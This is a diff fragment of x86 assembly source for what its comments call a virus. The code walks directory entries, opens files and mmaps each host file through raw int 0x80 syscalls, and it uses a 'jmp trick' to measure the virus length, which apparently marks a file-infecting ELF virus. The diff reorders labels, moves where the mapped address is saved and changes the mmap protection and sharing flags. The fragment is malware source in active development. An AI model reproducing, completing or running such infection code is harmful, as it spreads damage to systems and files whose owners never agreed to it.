@@ -78,15 +78,17 @@ openfile:
     cmpb $0, %al
     jl dirents
 
+before_mmap:
     call mmap
-    # save addr
-    mov %eax, 20(%esp)
     # save fd for close
     mov %ebx, 12(%esp)
     # save filesz for unmap
     mov %ecx, 16(%esp)
     cmp $-1, %eax
     je exit
+
+    # save addr
+    mov %eax, 20(%esp)
 
     # use the jmp trick to get the virus length
     jmp _vstart
@@ -174,7 +176,6 @@ mmap:
     sub $88, %eax
     mov %eax, %esi
 
-do_mmap:
     push %eax
 
     # find file size
@@ -201,14 +202,15 @@ do_mmap:
     cmp $0, %eax
     jl mmap_fail
 
+do_mmap:
     # mmap host 
     mov $192, %eax
     # fd
     mov %ebx, %edi
     xor %ebx, %ebx
     sub $0x1, %ecx
-    mov $0x7, %edx
-    mov $0x1, %esi
+    mov $0x3, %edx
+    mov $0x2, %esi
     xor %ebp, %ebp
     int $0x80
     cmp $-1, %eax
